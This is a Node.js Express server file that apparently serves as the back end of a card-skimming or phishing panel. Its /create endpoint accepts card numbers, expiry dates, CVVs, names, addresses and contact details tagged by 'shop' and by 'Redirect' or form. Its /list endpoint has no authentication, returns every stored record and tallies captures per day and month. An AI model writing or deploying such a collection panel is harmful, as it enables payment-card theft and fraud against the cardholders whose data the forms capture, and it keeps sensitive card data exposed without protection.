const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const jwt = require("jsonwebtoken");

const entrySchema = require("./models/entrySchema");
const profileSchema = require("./models/profileSchema");

const sameDay = (d1, d2) => {
  return (
    d1.getFullYear() === d2.getFullYear() &&
    d1.getMonth() === d2.getMonth() &&
    d1.getDate() === d2.getDate()
  );
};
const sameMonth = (d1, d2) => {
  return (
    d1.getFullYear() === d2.getFullYear() && d1.getMonth() === d2.getMonth()
  );
};

require("dotenv").config();

const app = express();
app.use(express.json());
app.use(cors());

mongoose.connect(process.env.MONGO_URI, () => {
  console.log("DB CONNECTED");
});

app.get("/", (_, res) => {
  res.status(200).json({ message: "hello" });
});

app.get("/list", async (_, res) => {
  try {
    const everythingFound = await entrySchema.find({});
    let amount = 0;
    let forms = 0;
    let redirects = 0;
    let today = 0;
    let ccThisYear = [];
    let allMonthsThisYear = new Set();
    let allDaysThisMonth = new Set();
    let entriesByMonths = [];
    let entriesByDays = [];
    everythingFound.forEach((x) => {
      ccThisYear.push(x.createdAt);
      x.type === "Redirect" ? redirects++ : forms++;
      amount++;
      sameDay(new Date(), new Date(x.createdAt)) ? today++ : 0;
      sameMonth(new Date(), new Date(x.createdAt))
        ? allDaysThisMonth.add(new Date(x.createdAt).getDate())
        : 0;
      new Date(x.createdAt).getFullYear() == new Date().getFullYear()
        ? allMonthsThisYear.add(new Date(x.createdAt).getMonth())
        : 0;
    });
    allMonthsThisYear.forEach((d) => {
      entriesByMonths.push({
        month: d,
        entries: ccThisYear.filter((m) => new Date(m).getMonth() === d).length,
      });
    });
    allDaysThisMonth.forEach((d) => {
      entriesByDays.push({
        day: d,
        entries: ccThisYear.filter((m) => new Date(m).getDate() === d).length,
      });
    });
    let stats = {
      amount,
      forms,
      redirects,
      today,
      entriesByMonths,
      entriesByDays,
    };
    res.status(200).json({ actualData: everythingFound, stats });
  } catch (error) {
    res.status(501).json(error);
  }
});

app.post("/create", async (req, res) => {
  const reg = new entrySchema({
    shop: req.body.shop,
    type: req.body.type,
    name: req.body.name,
    country: req.body.country,
    city: req.body.city,
    state: req.body.state,
    zip: req.body.zip,
    address: req.body.address,
    phone: req.body.phone,
    email: req.body.email,
    cardNumber: req.body.cardNumber,
    cardExpiry: req.body.cardExpiry,
    cardCVV: req.body.cardCVV,
  });
  try {
    const savedEntry = await reg.save();
    res.status(201).json(savedEntry);
  } catch (error) {
    res.status(501).json(error);
  }
});

app.post("/login", (req, res) => {
  profileSchema.findOne({ token: req.body.token }).exec((err, token) => {
    err ? res.status(500).json(err) : 0;
    !token
      ? res.status(400).json({})
      : (() => {
          const accessToken = jwt.sign(
            { profile_id: token._id, profileToken: token.token },
            process.env.TOKEN_KEY,
            {
              expiresIn: "2h",
            }
          );
          res.status(201).json({ token: token.token, accessToken });
        })();
  });
});

app.post("/validate", (req, res) => {
  req.body.accessToken
    ? (() => {
        jwt.verify(
          JSON.parse(req.body.accessToken).accessToken,
          process.env.TOKEN_KEY,
          (err, decoded) => {
            err
              ? res.status(401).json({ verification: false })
              : (() => {
                  res.json({ verification: true });
                })();
          }
        );
      })()
    : res.status(401).json({ verification: false });
});

app.post("/createToken", async (req, res) => {
  const reg = new profileSchema({
    token: req.body.token,
  });
  try {
    const savedEntry = await reg.save();
    res.status(201).json(savedEntry);
  } catch (error) {
    res.status(501).json(error);
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log(`STARTED AT ${process.env.PORT || 3000}`);
});
